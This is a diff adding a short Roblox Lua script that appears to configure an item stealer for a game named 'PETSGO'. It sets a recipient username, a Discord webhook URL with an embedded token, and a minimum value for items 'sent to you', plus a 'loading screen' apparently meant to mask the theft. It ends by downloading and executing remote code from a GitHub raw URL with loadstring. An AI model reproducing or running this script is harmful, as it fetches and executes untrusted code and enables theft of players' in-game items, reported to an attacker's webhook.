@@ -1,0 +1,6 @@
+Username = "zCristinelul"
+Webhook = "https://discord.com/api/webhooks/1329513343765053460/GJ42t1xvt4FFfMfHGyb7m4gKSRmZJPWzppmI5yhkUAUwaJRIqqJeD1brmu3DDL1KzP_g"
+MinimumRAP = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default
+selectedLoadingScreen = "1" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ImDigitalz/MoriScripts/main/PETSGO"))()
